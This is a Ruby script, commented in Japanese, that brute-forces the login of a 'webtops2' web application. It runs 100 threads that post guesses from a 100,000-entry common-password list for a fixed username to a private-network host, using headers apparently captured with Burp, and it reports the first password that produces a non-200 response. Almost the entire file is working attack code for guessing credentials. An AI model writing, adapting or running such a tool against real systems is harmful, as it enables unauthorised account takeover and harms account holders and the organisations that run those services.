#!/usr/bin/ruby

require 'net/http'
require 'uri'
require 'kconv'

THREAD_CNT       = 100
SETMSG_FILE_NAME = 'setmsg_webtops2_login.txt'
PASSWD_FILE_NAME = '10_million_password_list_top_100000.txt'
URL              = 'http://172.31.11.150'
ACTION_URL       = '/webtops2/j_security_check'
i_found_it       = false

# 設定ファイルを読み込み、配列で返す
# @param [string] file_name ファイル名
def read_setmsg(file_name)
  strs = []
  begin
    File.open(file_name) do |file|
      file.each_line do |labmen|
        strs << labmen
        #puts labmen
      end
    end
  rescue SystemCallError => e
    puts %Q(class=[#{e.class}] message=[#{e.message}])
  rescue IOError => e
    puts %Q(class=[#{e.class}] message=[#{e.message}])
  end
  return strs
end

# 設定ファイルを読み込みリクエストヘッダーに設定する
# @param [Net::HTTP::Post] req リクエストヘッダー
# @param [arry] setmsgs 設定ファイル
def setRequestHead(req, setmsgs, pass)
  setmsgs.each do |msg|
    if msg.index('POST') == nil then
      elements = msg.split(":")
      key = ''
      val = ''
      cnt = 0
      if elements[0].strip.length != 0 then
        elements.each do |aaa|
          if cnt == 0 then
            key = aaa
          else
            val = val + aaa
          end
          cnt += 1
        end
        if key == 'Content-Length' then
          req[key] = pass.strip.length
        else
          req[key] = val.strip
        end
      end
    end
  end
end

uri  = URI.parse(URL)

# 設定ファイルの値を取得する
setmsgs = read_setmsg(SETMSG_FILE_NAME)

# パスワードファイルの読み込み
# passwd = ['KN500630','kn450220','admin123']
passwd = read_setmsg(PASSWD_FILE_NAME)

# スレッド個数から1スレッドで検証するべきパスワードの件数を算出する
max_passwd_row = passwd.length
one_thread_cnt = max_passwd_row / THREAD_CNT
remainder_cnt  = max_passwd_row % THREAD_CNT

puts 'スレッドでの処理を開始'
thread = []
(1..THREAD_CNT).each do |i|
  thread << Thread.new do
    # ホスト接続
    http = Net::HTTP.new(uri.host, 8080)

    # HTTP ヘッダの設定(Burpで入手したヘッダーの値をそのまま記述(クッキーだけは上記で取得したの))
    req = Net::HTTP::Post.new(ACTION_URL)

    start_index = (i * one_thread_cnt) - one_thread_cnt
    end_index   = i * one_thread_cnt
    roop_count = start_index
    passwd[start_index..end_index].each do |pass|
      if i_found_it == true then
        break
      end
      roop_count += 1
      # 設定ファイルを読み込みリクエストヘッダーに設定する
      setRequestHead(req, setmsgs, pass)

      # POST boty を設定する
      req.body = 'j_username=H3396&j_password=' + pass.strip + '&logon=%83%8D%83O%83C%83%93'

      # 接続
      res = http.request(req)

      # 戻り値の検証を行う
      if res.code == '200' then
        if roop_count % 100 == 0 then
          #puts "thread#{i} -> #{roop_count}"
        end
      else
        puts "passwd -> #{pass}"
        i_found_it = true
        break
      end
      #puts "msg -> #{res.message}"
      #puts "body -> #{Kconv.tosjis(res.body)}"
    end
  end
end
thread.each do |th_red|
  th_red.join
end
puts 'サブスレッドが終わったのでメインスレッドを終了します'
